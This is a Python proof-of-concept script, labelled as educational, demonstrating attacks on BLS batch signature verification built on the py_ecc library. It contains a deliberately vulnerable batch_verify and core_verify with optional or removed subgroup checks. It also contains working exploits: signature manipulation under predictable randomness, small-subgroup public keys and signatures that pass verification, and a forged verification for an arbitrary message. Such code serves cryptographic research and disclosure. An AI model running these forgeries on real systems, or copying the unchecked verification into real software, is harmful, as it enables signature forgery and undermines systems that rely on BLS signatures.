# Warning: the file contains vulnerable code to demonstrate proof of concept attacks
# for educational purpose only. Do not use.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# Attacks description: https://ethresear.ch/t/security-of-bls-batch-verification/10748
from py_ecc.bls import G2ProofOfPossession as bls_pop

from typing import (
    Sequence,
)
from eth_typing import (
    BLSPubkey,
    BLSSignature,
)
from hashlib import sha256
from py_ecc.fields import optimized_bls12_381_FQ12 as FQ12
from py_ecc.optimized_bls12_381 import (
    add,
    curve_order,
    final_exponentiate,
    G1,
    multiply,
    neg,
    pairing,
    Z1,
    Z2,
)
import os
from py_ecc.bls.hash import (
    i2osp,
    os2ip,
)
from py_ecc.bls.hash_to_curve import hash_to_G2
from py_ecc.bls.g2_primitives import (
    G1_to_pubkey,
    G2_to_signature,
    pubkey_to_G1,
    signature_to_G2,
    G2_to_signature,
    subgroup_check
)
from py_ecc.fields import (
    optimized_bls12_381_FQ as FQ,
    optimized_bls12_381_FQP as FQP,
    optimized_bls12_381_FQ2 as FQ2,
    optimized_bls12_381_FQ12 as FQ12,
)
from py_ecc.bls import G2ProofOfPossession as bls_pop
DST = b'BLS_SIG_BLS12381G2_XMD:SHA-256_SSWU_RO_POP_'
xmd_hash_function = sha256


def batch_verify(PKs: Sequence[BLSPubkey], messages: Sequence[bytes], signatures: Sequence[BLSSignature], randoms: Sequence[int] = None, check_subgroup: bool = True) -> bool:
    n = len(PKs)
    sig = Z2
    aggregate = FQ12.one()
    r = [None] * n
    for i in range(n):
        if check_subgroup and (not subgroup_check(signature_to_G2(signatures[i])) or not subgroup_check(pubkey_to_G1(PKs[i]))):
            return False
        r[i] = os2ip(os.urandom(32)) if randoms == None else randoms[i]
        sig = add(sig, multiply(signature_to_G2(signatures[i]), r[i]))
        pubkey_point = pubkey_to_G1(PKs[i])
        message_point = hash_to_G2(messages[i], DST, xmd_hash_function)
        aggregate *= pairing(message_point, multiply(pubkey_point,
                             r[i]), final_exponentiate=False)
    aggregate *= pairing(sig, neg(G1), final_exponentiate=False)
    res = final_exponentiate(aggregate) == FQ12.one()
    if res:
        print('Batch verify true, randomness: ', r)
    return res


messages = [b'\x00', b'\x01', b'\x02']
private_keys = [3, 14, 159]
public_keys = [bls_pop.SkToPk(key) for key in private_keys]
signatures = [bls_pop.Sign(private_keys[i], messages[i])
              for i in range(len(private_keys))]
print('Batch verify result:', batch_verify(public_keys, messages, signatures))

# Predictable randomness and signature manipulation attack.
randoms = [7, 8, 9]
N = 1024


def is_win_lottery(sig: BLSSignature):
    return os2ip(sig) % N == 0


# No signer wins the lottery.
for i in range(len(signatures)):
    print('User', i, ' wins the lottery?', is_win_lottery(signatures[i]))

# Choose a random point in the group.
P = signature_to_G2(bls_pop.Sign(12323, b'\x00'))
s0 = signature_to_G2(signatures[0])
k = 1
while True:
    s0_prime = add(s0, neg(multiply(P, k)))
    if is_win_lottery(G2_to_signature(s0_prime)):
        print(os2ip(G2_to_signature(s0_prime)), k)
        break
    k += 1

print('Now create a manipulated set of signatures so that the first signer wins the lottery while keeping batch verify returning true.')
# inverse_mod(randoms[1], curve_order)
r1_inverse = 45881390778235416669516772944662720107979233437961683094778201362446258536449
s1 = signature_to_G2(signatures[1])
modified_signatures = [G2_to_signature(add(s0, neg(multiply(P, k)))),
                       G2_to_signature(
                           add(s1, multiply(P, k * randoms[0] * r1_inverse))),
                       signatures[2]]
for i in range(len(signatures)):
    print('User', i, ' wins the lottery?',
          is_win_lottery(modified_signatures[i]))
print('Batch verify result:', batch_verify(
    public_keys, messages, modified_signatures, randoms))

print('Missing subgroup check and attack with small subgroup public key and small subgroup signature.')
# P1_prime has order 11 in E1.
P1_prime = (FQ(2979670670310764568875432584853779235952086868415185959349978692557041658123457012371196582200206075137700696818072), FQ(
    3570755650945290361016687161973730470832965652813273562757802468024007222691487305952463066422598292044839173759896), FQ(1),)
# sig1_prime has order 13 in E2
sig1_prime = (FQ2((2602674338885123821912227916346206600582798488689654562146298137693484256979209535639219043197073695345779579864661, 3351839238641506648435078263228468515537551095800761773161950425870176959767415345035303236484064230894991619346266,)), FQ2(
    (3485020849252832679337806139510557182028380297679373791166296072133856625341906528515295585292051120770827085126259, 2145420343451204691027806674946231650983706263900393084397561047074993475760782975368937449276071527861944647831938)), FQ2.one(),)
modified_pubkeys = [G1_to_pubkey(P1_prime), public_keys[1], public_keys[2]]
modified_sigs = [G2_to_signature(sig1_prime), signatures[1], signatures[2]]
print('Batch verify with public key of order 11, signature of order 13, randomness [11*13, 123456789, 987654321]:', batch_verify(
    modified_pubkeys, messages, modified_sigs, [11*13, 123456789, 987654321], False))
while True:
    if batch_verify(modified_pubkeys, messages, modified_sigs, None, False):
        break


# This method is exactly as _CoreVerify https://github.com/ethereum/py_ecc/blob/master/py_ecc/bls/ciphersuites.py#L141, but remove subgroup check.
def core_verify(PK: BLSPubkey, message: bytes,
                signature: BLSSignature) -> bool:
    signature_point = signature_to_G2(signature)
    print(pairing(
        hash_to_G2(message, DST, xmd_hash_function),
        pubkey_to_G1(PK),
        final_exponentiate=True,
    ))
    final_exponentiation = final_exponentiate(
        pairing(
            signature_point,
            G1,
            final_exponentiate=False,
        ) * pairing(
            hash_to_G2(message, DST, xmd_hash_function),
            neg(pubkey_to_G1(PK)),
            final_exponentiate=False,
        )
    )
    return final_exponentiation == FQ12.one()


# P1_prime has order 11 in E1.
P1_prime = (FQ(2979670670310764568875432584853779235952086868415185959349978692557041658123457012371196582200206075137700696818072), FQ(
    3570755650945290361016687161973730470832965652813273562757802468024007222691487305952463066422598292044839173759896), FQ(1),)
message = os.urandom(32)
print('Core verify with *non* zero public key for arbitrary message: ', core_verify(G1_to_pubkey(P1_prime), message,
      b'\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'))
